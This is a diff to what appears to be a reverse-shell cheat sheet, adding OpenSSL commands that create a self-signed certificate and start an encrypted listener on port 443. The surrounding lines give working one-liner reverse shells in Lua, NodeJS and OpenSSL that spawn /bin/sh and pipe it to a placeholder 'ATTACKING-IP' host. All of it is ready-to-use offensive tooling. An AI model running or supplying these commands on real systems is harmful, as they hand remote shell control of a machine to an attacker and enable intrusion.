@@ -59,6 +59,10 @@ lua5.1 -e 'local host, port = "ATTACKING-IP", 443 local socket = require("socket
 NodeJS Linux:
 (function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(443, "ATTACKING-IP", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();
 
+OpenSSL Listener in Linux:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 443
+
 OpenSSL Linux:
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKING-IP>:<PORT> > /tmp/s; rm /tmp/s
 
